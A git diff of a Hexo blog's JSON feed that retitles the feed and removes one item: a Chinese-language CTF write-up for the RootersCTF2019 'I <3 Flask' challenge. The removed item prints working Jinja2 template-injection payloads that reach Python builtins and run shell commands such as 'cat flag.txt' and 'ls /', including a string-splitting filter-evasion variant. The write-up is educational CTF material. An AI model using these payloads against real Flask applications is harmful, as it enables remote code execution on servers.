@@ -1,6 +1,6 @@
 {
     "version": "https://jsonfeed.org/version/1",
-    "title": "Hexo • All posts by \"ssti\" category",
+    "title": "Hexo • All posts by \"phar反序列化\" tag",
     "description": "",
     "home_page_url": "http://odiws.github.io",
     "items": [
@@ -13,16 +13,6 @@
             "tags": [
                 "buuctf",
                 "phar反序列化"
-            ]
-        },
-        {
-            "id": "http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/",
-            "url": "http://odiws.github.io/2024/06/06/[RootersCTF2019]I_3_Flask/",
-            "title": "'[RootersCTF2019]I_<3_Flask'",
-            "date_published": "2024-06-06T11:43:07.000Z",
-            "content_html": "<h2 id=\"rootersctf2019i_️_flask\"><a class=\"markdownIt-Anchor\" href=\"#rootersctf2019i_️_flask\">#</a> [RootersCTF2019]I_❤️_Flask</h2>\n<p><img data-src=\"../images/%5BRootersCTF2019%5DI_3_Flask/1.png\" alt=\"1\"></p>\n<p>arjun 工具用于</p>\n<p><img data-src=\"../images/%5BRootersCTF2019%5DI_3_Flask/2.png\" alt=\"2\"></p>\n<p>这题没有过滤，直接用常规的注入语句即可</p>\n<pre><code>?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('cat flag.txt').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p>拿到 flag<br>\n<img data-src=\"../images/%5BRootersCTF2019%5DI_3_Flask/3.png\" alt=\"3\"></p>\n<p>在该文件同地址的模板是这样的：</p>\n<p>但是如果是根目录就是：</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\n&#123;% if c.__name__ == 'catch_warnings' %&#125;\n  &#123;% for b in c.__init__.__globals__.values() %&#125;\n  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;\n    &#123;% if 'eva'+'l' in b.keys() %&#125;\n      &#123;&#123; b['eva'+'l']('__impor'+'t__'+'(\"o'+'s\")'+'.pope'+'n'+'(\"ls /\").read()') &#125;&#125;\n    &#123;% endif %&#125;\n  &#123;% endif %&#125;\n  &#123;% endfor %&#125;\n&#123;% endif %&#125;\n&#123;% endfor %&#125;\n</code></pre>\n<p>还可以：</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p>还可以用 fenjing 直接秒了：</p>\n<p>使用方法博客上有：</p>\n<p>直接秒了</p>\n<p><img data-src=\"../images/%5BRootersCTF2019%5DI_3_Flask/4.png\" alt=\"4\"></p>\n",
-            "tags": [
-                "buuctf"
             ]
         }
     ]
